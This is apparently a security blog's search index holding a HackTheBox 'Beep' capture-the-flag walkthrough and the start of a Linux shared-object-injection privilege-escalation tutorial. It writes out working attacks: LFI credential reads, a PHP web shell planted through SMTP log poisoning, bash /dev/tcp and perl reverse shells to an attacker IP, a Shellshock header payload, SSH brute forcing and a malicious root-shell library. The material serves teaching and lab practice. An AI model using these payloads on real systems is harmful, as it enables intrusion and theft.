[{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-12-23","objectID":"/htb_beep/","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Set up First I create a working directory: ❯ mkdir Beep ❯ cd !$ cd Beep Then I use the mk function that I have defined in my zsh configuration file, which I use to create my working directories: ❯ which mk mk () { mkdir {scans,content,loot,exploits,scripts,report} } ❯ mk ❯ ls  content  exploits  loot  report  scans  scripts Recon ","date":"2021-12-23","objectID":"/htb_beep/:0:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"OS Fingerprinting This is the function that I have defined zsh configuration file .zshrc for identifying the operating system based on TTL value: ❯ which os os () { ttl=\"$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' ' -f 1 | tr -d '\\n')\" if (( $ttl \u003c= 64 )) then echo 'OS: Unix/Linux' elif (( $ttl \u003c= 128 )) then echo 'OS: Windows' else echo 'OS: Not detected' fi } We can identify the OS by running the following command: ❯ os 10.10.10.7 OS: Unix/Linux ","date":"2021-12-23","objectID":"/htb_beep/:1:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"TCP SYN Scan Then we can try to run a TCP SYN scan, not to be confused with a TCP connect scan, nmap uses a TCP SYN Scan -sS by default, so you don’t have to specify it. You can read the man page here: ❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.7 [sudo] password for kali: Sorry, try again. [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 15:48 EST Nmap scan report for 10.10.10.7 Host is up (0.25s latency). Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap 443/tcp open https 878/tcp open unknown 993/tcp open imaps 995/tcp open pop3s 3306/tcp open mysql 4190/tcp open sieve 4445/tcp open upnotifyp 4559/tcp open hylafax 5038/tcp open unknown 10000/tcp open snet-sensor-mgmt Nmap done: 1 IP address (1 host up) scanned in 11.31 seconds ","date":"2021-12-23","objectID":"/htb_beep/:2:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Service Fingerprinting This is another function that I have in my zsh to extract TCP ports: ❯ which xp xp () { ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\" echo \"[+] Open ports: $ports\" \u003e\u003e xp.tmp printf $ports | xclip -sel clip echo \"[+] Ports copied to clipboard\" \u003e\u003e xp.tmp /usr/bin/bat xp.tmp rm xp.tmp } Then I extract the TCP ports: ❯ xp scans/nmap-tcpall ───────┬─────────────────────────────────────────────────────────────────────────────── │ File: xp.tmp ───────┼─────────────────────────────────────────────────────────────────────────────── 1 │ [+] Open ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038, │ 10000 2 │ [+] Ports copied to clipboard ───────┴─────────────────────────────────────────────────────────────────────────────── Nmap has some scripts which we can use to gather information about services: find / -name '*.nse' -type f 2\u003e/dev/null Now I like to enumerate the services by using nmap scripts and see the run time with -vvv: sudo nmap -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 -n -Pn --min-rate 5000 -sCV -oN scans/nmap-tcpscripts 10.10.10.7 -vvv Once it finishes, we can read the nmap file: cat scans/nmap-tcpscripts.nmap Web - TCP 80 -\u003e TCP 443 ","date":"2021-12-23","objectID":"/htb_beep/:3:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Response Headers Enumeration When we enumerate the response headers we can see a 302 found: ❯ curl -I http://10.10.10.7 HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 22:44:21 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Connection: close Content-Type: text/html; charset=iso-8859-1 Let’s follow the redirect with -L: ❯ curl -I http://10.10.10.7 -L HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 22:44:29 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Connection: close Content-Type: text/html; charset=iso-8859-1 curl: (60) SSL certificate problem: self signed certificate More details here: https://curl.se/docs/sslcerts.html curl failed to verify the legitimacy of the server and therefore could not establish a secure connection to it. To learn more about this situation and how to fix it, please visit the web page mentioned above. We can see an SSL certificate problem, so let’s ignore it with -k: ❯ curl -Ik http://10.10.10.7 -L HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 22:46:05 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Connection: close Content-Type: text/html; charset=iso-8859-1 HTTP/1.1 200 OK Date: Wed, 22 Dec 2021 22:46:06 GMT Server: Apache/2.2.3 (CentOS) X-Powered-By: PHP/5.1.6 Set-Cookie: elastixSession=7mh9441083miqlnc9f5t7iff25; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Connection: close Content-Type: text/html; charset=UTF-8 Alternatively, we can do this in one go with whatweb: ❯ whatweb -a 3 -v 10.10.10.7 WhatWeb report for http://10.10.10.7 Status : 302 Found Title : 302 Found IP : 10.10.10.7 Country : RESERVED, ZZ Summary : HTTPServer[CentOS][Apache/2.2.3 (CentOS)], Apache[2.2.3], RedirectLocation[https://10.10.10.7/] Detected Plugins: [ Apache ] The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows NT. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards. Version : 2.2.3 (from HTTP Server Header) Google Dorks: (3) Website : http://httpd.apache.org/ [ HTTPServer ] HTTP server header string. This plugin also attempts to identify the operating system from the server header. OS : CentOS String : Apache/2.2.3 (CentOS) (from server string) [ RedirectLocation ] HTTP Server string location. used with http-status 301 and 302 String : https://10.10.10.7/ (from location) HTTP Headers: HTTP/1.1 302 Found Date: Wed, 22 Dec 2021 23:02:27 GMT Server: Apache/2.2.3 (CentOS) Location: https://10.10.10.7/ Content-Length: 278 Connection: close Content-Type: text/html; charset=iso-8859-1 WhatWeb report for https://10.10.10.7/ Status : 200 OK Title : Elastix - Login page IP : 10.10.10.7 Country : RESERVED, ZZ Summary : X-Powered-By[PHP/5.1.6], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], Script[text/javascript], Apache[2.2.3], PasswordField[input_pass], Cookies[elastixSession], PHP[5,5.1,5.1.6] Detected Plugins: [ Apache ] The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows NT. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards. Version : 2.2.3 (from HTTP Server Header) Google Dorks: (3) Website : http://httpd.apache.org/ [ Cookies ] Display the names of cookies in the HTTP headers. The values are not returned to save on space. String : elastixSession [ HTTPServer ] HTTP server header string. This plugin also attempts to identify the operating system from the server header. OS : CentOS String : Apache/2.2.3 (CentOS) (from server string) [ PHP ] PHP is a widely-used general-purpose scripting language that is especially suited for Web development and can be embedded into HTML. This plugin identifies PHP errors, module","date":"2021-12-23","objectID":"/htb_beep/:4:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Directory \u0026 Files Fuzzing The most common wordlists for fuzzing are: common.txt big.txt directory-list.2.3-medium.txt I’m gonna remove the lines that start with a comment from the wordlist directory-list.2.3-medium.txt and create a new wordlists without them: catn /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -v '^#' \u003e directory-list-2.3-medium.txt Since we know this site uses PHP we can add an extension list: ❯ ffuf -w directory-list-2.3-medium.txt -u https://10.10.10.7/FUZZ -e .php,.txt -t 150 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u003c3 ________________________________________________ :: Method : GET :: URL : https://10.10.10.7/FUZZ :: Wordlist : FUZZ: directory-list-2.3-medium.txt :: Extensions : .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 150 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ images [Status: 301, Size: 310, Words: 20, Lines: 10] index.php [Status: 200, Size: 1785, Words: 103, Lines: 35] [Status: 200, Size: 1785, Words: 103, Lines: 35] help [Status: 301, Size: 308, Words: 20, Lines: 10] register.php [Status: 200, Size: 1785, Words: 103, Lines: 35] themes [Status: 301, Size: 310, Words: 20, Lines: 10] modules [Status: 301, Size: 311, Words: 20, Lines: 10] mail [Status: 301, Size: 308, Words: 20, Lines: 10] admin [Status: 301, Size: 309, Words: 20, Lines: 10] static [Status: 301, Size: 310, Words: 20, Lines: 10] lang [Status: 301, Size: 308, Words: 20, Lines: 10] config.php [Status: 200, Size: 1785, Words: 103, Lines: 35] robots.txt [Status: 200, Size: 28, Words: 3, Lines: 3] var [Status: 301, Size: 307, Words: 20, Lines: 10] panel [Status: 301, Size: 309, Words: 20, Lines: 10] [WARN] Caught keyboard interrupt (Ctrl-C) ","date":"2021-12-23","objectID":"/htb_beep/:5:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"/admin Going to /admin, it prompts for a HTTP Basic Authentication Login: ![[admin.png]] If we try admin:admin it doesn’t login, however, if we hit cancel we get redirected to /admin/config.php: ![[http-basic-auth-cancel-redirect.png]] ","date":"2021-12-23","objectID":"/htb_beep/:5:1","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"LFI If we use searchsploit to find exploits on Elastix: ❯ searchsploit elastix ----------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------- --------------------------------- Elastix - 'page' Cross-Site Scripting | php/webapps/38078.py Elastix - Multiple Cross-Site Scripting Vulnerabilit | php/webapps/38544.txt Elastix 2.0.2 - Multiple Cross-Site Scripting Vulner | php/webapps/34942.txt Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt Elastix \u003c 2.5 - PHP Code Injection | php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Executi | php/webapps/18650.py ----------------------------------------------------- --------------------------------- Shellcodes: No Results We can see a view exploits, to narrow this down we can use the machine hint, which says LFI, or we can read each exploit and confirm if the vulnerability exist, in this case if we read the exploit the following perl exploit: ❯ searchsploit -x php/webapps/37637.pl There’s a line that we can use to confirm if this file exists: #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action We can use curl to confirm that this file exists: ❯ curl -Isk https://10.10.10.7/vtigercrm/graph.php HTTP/1.1 200 OK Date: Wed, 22 Dec 2021 23:12:58 GMT Server: Apache/2.2.3 (CentOS) X-Powered-By: PHP/5.1.6 Connection: close Content-Type: text/html; charset=UTF-8 We can confirm the POC with curl: ❯ curl -vsk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action\" * Trying 10.10.10.7:443... * Connected to 10.10.10.7 (10.10.10.7) port 443 (#0) \u003c..SNIP..\u003e # AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE \u003c..SNIP..\u003e Because there is no filtering of ‘../’ and I can pass percent %00 to truncate the text, the current_language option leads to a file. The percent %00 indicates that PHP is adding the .php extension to the input before including it. Adding percent %00 to an outdated PHP instance would truncate the string, causing the .php to be disregarded. It seems that we have some passwords from the output above, we can filter this down: ❯ curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action\" | grep -E 'PASS=|PASSWORD=' # AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE #AMPMGRPASS=amp111 AMPMGRPASS=jEhdIekWmdjE #FOPPASSWORD=passw0rd FOPPASSWORD=jEhdIekWmdjE ARI_ADMIN_PASSWORD=jEhdIekWmdjE Save this to a file: curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action\" | grep -E 'PASS=|PASSWORD=' | cut -d '=' -f 2 | uniq -u \u003e\u003e passwords.txt Now we have a passwords list: amp109 amp111 jEhdIekWmdjE passw0rd Since we have LFI, we can try to enumerate users as well, let’s read the /etc/passwd file: ❯ curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00\u0026module=Accounts\u0026action\" root❌0:0:root:/root:/bin/bash bin❌1:1:bin:/bin:/sbin/nologin daemon❌2:2:daemon:/sbin:/sbin/nologin adm❌3:4:adm:/var/adm:/sbin/nologin lp❌4:7:lp:/var/spool/lpd:/sbin/nologin sync❌5:0:sync:/sbin:/bin/sync shutdown❌6:0:shutdown:/sbin:/sbin/shutdown halt❌7:0:halt:/sbin:/sbin/halt mail❌8:12:mail:/var/spool/mail:/sbin/nologin news❌9:13:news:/etc/news: uucp❌10:14:uucp:/var/spool/uucp:/sbin/nologin operator❌11:0:operator:/root:/sbin/nologin games❌12💯games:/usr/games:/sbin/nologin gopher❌13:30:gopher:/var/gopher:/sbin/nologin ftp❌14:50:FTP User:/var/ftp:/sbin/nologin nobody❌99:99:Nobody:/:/sbin/nologin mysql❌27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache❌94:94:Distcache:/:/sbin/nologin vcsa❌69:69:virtual console memory owner:/dev:/sbin/nologin pcap❌77:77::/var/arpwatch:/sbin/nologin ntp❌38:38::/etc/ntp:/sbin/nologin cyru","date":"2021-12-23","objectID":"/htb_beep/:6:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"SMTP User Enumeration We can validate that users have an email in SMTP: ❯ telnet 10.10.10.7 25 Trying 10.10.10.7... Connected to 10.10.10.7. Escape character is '^]'. 220 beep.localdomain ESMTP Postfix HELO 501 Syntax: HELO hostname HELO wixnic 250 beep.localdomain VRFY root@localhost 252 2.0.0 root@localhost VRFY root 252 2.0.0 root ","date":"2021-12-23","objectID":"/htb_beep/:6:1","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"SMTP Log Poisoning through LFI to RCE [Path #1] Since SMTP is open we can try to send emails with malicious code, this malicious code will be stored under log files under /var/mail/[username], we already have valid usernames so we can try to do Log Poisoning via SMTP and access the log via LFI. Let’s use telnet to send an email: telnet 10.10.10.7 25 HELO wixnic MAIL FROM:\u003cwixnic@helo.htb\u003e RCPT TO:\u003casterisk@localhost\u003e DATA Message from telnet PHP code: \u003c?php system($_REQUEST[\"telnet_cmd\"]); ?\u003e . QUIT This how the output of each input looks: ❯ telnet 10.10.10.7 25 Trying 10.10.10.7... Connected to 10.10.10.7. Escape character is '^]'. 220 beep.localdomain ESMTP Postfix HELO wixnic 250 beep.localdomain MAIL FROM:\u003cwixnic@helo.htb\u003e 250 2.1.0 Ok RCPT TO:\u003casterisk@localhost\u003e 250 2.1.5 Ok DATA 354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e Message from telnet PHP code: \u003c?php system($_REQUEST[\"telnet_cmd\"]); ?\u003e . 250 2.0.0 Ok: queued as 37235D92FD QUIT 221 2.0.0 Bye Connection closed by foreign host. Now send the curl request with the \u0026telnet_cmd parameter with the argument as the id command: curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00\u0026module=Accounts\u0026action\u0026telnet_cmd=id\" We can send an email with swaks: ❯ swaks --to asterisk@localhost --from wixnic@helo.htb --header \"Subject: Shell\" --body 'PHP code: \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e' --server 10.10.10.7 === Trying 10.10.10.7:25... === Connected to 10.10.10.7. \u003c- 220 beep.localdomain ESMTP Postfix -\u003e EHLO kali \u003c- 250-beep.localdomain \u003c- 250-PIPELINING \u003c- 250-SIZE 10240000 \u003c- 250-VRFY \u003c- 250-ETRN \u003c- 250-ENHANCEDSTATUSCODES \u003c- 250-8BITMIME \u003c- 250 DSN -\u003e MAIL FROM:\u003cwixnic@helo.htb\u003e \u003c- 250 2.1.0 Ok -\u003e RCPT TO:\u003casterisk@localhost\u003e \u003c- 250 2.1.5 Ok -\u003e DATA \u003c- 354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e -\u003e Date: Wed, 22 Dec 2021 19:07:02 -0500 -\u003e To: asterisk@localhost -\u003e From: wixnic@helo.htb -\u003e Subject: Shell -\u003e Message-Id: \u003c20211222190702.277580@kali\u003e -\u003e X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/ -\u003e -\u003e PHP code: \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e -\u003e -\u003e -\u003e . \u003c- 250 2.0.0 Ok: queued as D7063D92FD -\u003e QUIT \u003c- 221 2.0.0 Bye === Connection closed with remote host. Now we can read that file with the LFI at and add \u0026cmd=id at the end of the URL, to execute system commands: curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00\u0026module=Accounts\u0026action\u0026cmd=id\" Instead of id add a reverse shell, I’m also gonna encode the data, in this case the reverse shell code: ❯ curl -sk \"https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00\u0026module=Accounts\u0026action\" --data-urlencode \"cmd=bash -i \u003e\u0026 /dev/tcp/10.10.16.3/443 0\u003e\u00261\" Now we receive a shell: ❯ sudo nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 59168 bash: no job control in this shell bash-3.2$ id uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) bash-3.2$ whoami asterisk SSH - TCP 22 [Path #2] We can try to bruteforce SSH: ❯ crackmapexec ssh 10.10.10.7 -u htb/box/Beep/users.txt -p passwords.txt SSH 10.10.10.7 22 10.10.10.7 [*] SSH-2.0-OpenSSH_4.3 SSH 10.10.10.7 22 10.10.10.7 [-] root:amp109 Authentication failed. SSH 10.10.10.7 22 10.10.10.7 [+] root:jEhdIekWmdjE (Pwn3d!) We can also use hydra: ❯ hydra -L htb/box/Beep/users.txt -P passwords.txt -s 22 ssh://10.10.10.7 -v -t 4 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 18:37:00 [DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (l:6/p:4), ~6 tries per task [DATA] attacking ssh://10.10.10.7:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://root@10.10.10.7:22 [INFO] Succ","date":"2021-12-23","objectID":"/htb_beep/:7:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Shellshock [Path #3] Whenever there is CGI or a Script in a web application, it is good to try to test ShellShock. To test it, I will open burpsuite and send the login request to Repeater and replace the User-Agent header with the ShellShock exploit string () { :; };[cmd], starting with a 5 second sleep: User-Agent: () { :; };sleep 5 If we receive a reponse in 5 seconds then it works and that will confirm that is vulnerable to shellshock. Let’s try to ping ourselves back. Setup a listener on ICMP: sudo tcpdump -ni tun0 icmp Create a single ping request with -c 1: User-Agent: () { :; };ping -c 1 10.10.16.3 And we receive a connection: ❯ sudo tcpdump -ni tun0 icmp [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 18:56:11.688169 IP 10.10.10.7 \u003e 10.10.16.3: ICMP echo request, id 20511, seq 1, length 64 18:56:11.688182 IP 10.10.16.3 \u003e 10.10.10.7: ICMP echo reply, id 20511, seq 1, length 64 Let’s establish a reverse shell: User-Agent: () { :; };bash -i \u003e\u0026 /dev/tcp/10.10.16.3/443 0\u003e\u00261 We receive a connection as root: ❯ sudo nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 59290 bash: no job control in this shell [root@beep webmin]# id uid=0(root) gid=0(root) [root@beep webmin]# whoami root ","date":"2021-12-23","objectID":"/htb_beep/:8:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["HackTheBox Nix"],"content":"Webmin Command [Path #4] I can login to webmin with the credentials root:jEhdIekWmdjE. ![[webmin-admin-page.png]] This interface is designed to administer the system and we have root access because of the credentials that we found earlier so we can create a task as root: ![[schedule-command.png]] ![[schedule-command-created.png]] In a minute (depending on the time you have given them), the script will run and we will get a reverse shell: ❯ nc -lvnp 443 listening on [any] 443 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.7] 43947 bash: no job control in this shell [root@beep /]# id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) [root@beep /]# whoami root FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution [Path #5] Since we know that FreePBX is running of this server, we can try this POC: ❯ searchsploit elastix freepbx ----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py ----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Looking at the exploit we can see a payload: import urllib import ssl rhost=\"10.10.10.7\" # add the target IP lhost=\"10.10.16.3\" # add your IP lport=443 # change the port extension=\"1000\" # change the extension number with a valid number ssl._create_default_https_context = ssl._create_unverified_context # Reverse shell payload url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c\u0026callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A' urllib.urlopen(url) We need to modify the following: Change the Remote Host IP to the target IP Change the Local Host IP to ours. Change the Listening Port (if you want!) Change the extension number with a valid number We can use the sipvicious svwar python script to find valid extensions numbers. We can install sip vicious by reading it’s documentation page: git clone https://github.com/enablesecurity/sipvicious.git cd sipvicious sudo python3 setup.py install pip3 install . sipvicious_svcrack --help Now we need an invite and a range of extensions to find an authentication: ❯ sipvicious_svwar -m INVITE -e 100-999 10.10.10.7 2\u003e/dev/null +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ | 407 | weird | +-----------+----------------+ | 409 | weird | +-----------+----------------+ | 525 | weird | +-----------+----------------+ | 534 | weird | +-----------+----------------+ | 504 | weird | +-----------+----------------+ | 519 | weird | +-----------+----------------+ | 791 | weird | +-----------+----------------+ | 759 | weird | +-----------+----------------+ | 825 | weird | +-----------+----------------+ | 884 | weird | +-----------+----------------+ The extension 233 seems to be valid. We can get a reverse shell doing manually: curl -sk \"https://10.10.10.7/recordings/misc/callme_page.php?action=c\u0026callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.3%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\" Then catch","date":"2021-12-23","objectID":"/htb_beep/:9:0","tags":["ssh","smtp","freepbx","elastix","smtp-log-poisoning","ssh-algorithms","privilege-escalation-nmap","privilege-escalation-chmod","autopwn","bash","wget","curl","python"],"title":"HackTheBox - Beep","uri":"/htb_beep/"},{"categories":["Linux Privilege Escalation"],"content":"This is my description.","date":"2021-12-11","objectID":"/linux-privesc-so-injection/","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Video Setting Up Install the required packages for this video: low@ubuntu:~$ sudo apt update \u0026\u0026 sudo apt install -y vim gcc Now clear the screen: low@ubuntu:~$ clear Let’s start by creating a working directory: low@ubuntu:~$ mkdir so-files low@ubuntu:~$ cd !$ cd so-files low@ubuntu:~/so-files$ We’ll create a file named libcustom.c: low@ubuntu:~/so-files$ vim libcustom.c This print a message and nothing more: #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003csys/types.h\u003e void say_hi(){ printf(\"Message from libcustom.c\\n\"); } Then we’ll create a header file named libcustom.h, which is the header file: low@ubuntu:~/so-files$ vim libcustom.h This code basically calls an external function, in this case the function called say_hi: #ifndef say_hi_h__ #define say_hi_h__ extern void say_hi(void); #endif // say_hi_h__ Now we will write create a program that simply prints a message. I will name this file as myexec.c: low@ubuntu:~/so-files$ vim myexec.c This code imports the libcustom.h header file, the main() function prints a message and it executes the say_hi() function which is found in the header file libcustom.h and if the execution is successful it returns a status code of (0): #include \u003cstdio.h\u003e#include \"libcustom.h\" int main(){ printf(\"Message from myexec.c!\\n\"); say_hi(); return 0; } Now create a new directory named evil and navigate there, this is where the malicious library will be placed: low@ubuntu:~/so-files$ mkdir evil low@ubuntu:~/so-files$ cd !$ cd evil low@ubuntu:~/so-files/evil$ Lastly, we’ll create the code that will be included in the malicious library file. I’ll named this file as libcustom.c: low@ubuntu:~/so-files/evil$ vim libcustom.c This code sets the UID (0) which is the UID of the root user. Then it sets the GID of (0) which the root group. The next three lines print a message of their own. The last line spawns a bash shell: #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003csys/types.h\u003e void say_hi(){ setuid(0); setgid(0); printf(\"I'm the bad library!\\n\"); printf(\"I'm trying to spawn a root shell...\\n\"); printf(\"Check your shell!\\n\"); system(\"/bin/bash\"); } Now copy the original header file to our current working directory: low@ubuntu:~/so-files/evil$ cp ../libcustom.h . low@ubuntu:~/so-files/evil$ ls libcustom.c libcustom.h Let’s create the malicious shared object: low@ubuntu:~/so-files/evil$ gcc -c -Wall -Werror -fPIC libcustom.c low@ubuntu:~/so-files/evil$ gcc -shared -o libcustom.so libcustom.o low@ubuntu:~/so-files/evil$ ls -l total 28 -rw-rw-r-- 1 low low 281 Dec 10 12:13 libcustom.c -rw-rw-r-- 1 low low 88 Dec 10 12:14 libcustom.h -rw-rw-r-- 1 low low 2104 Dec 10 12:14 libcustom.o -rwxrwxr-x 1 low low 16360 Dec 10 12:14 libcustom.so Now go back to the main directory: low@ubuntu:~/so-files/evil$ cd ~/so-files This creates an object file: low@ubuntu:~/so-files$ gcc -c -Wall -Werror -fPIC libcustom.c Then create a shared object file: low@ubuntu:~/so-files$ gcc -shared -o libcustom.so libcustom.o Copy the shared object to the library directory: low@ubuntu:~/so-files$ sudo cp libcustom.so /usr/lib/ Finally, compile the program: low@ubuntu:~/so-files$ gcc -Wall -o myexec myexec.c -lcustom Then we can confirm how this is loading the library with ldd: 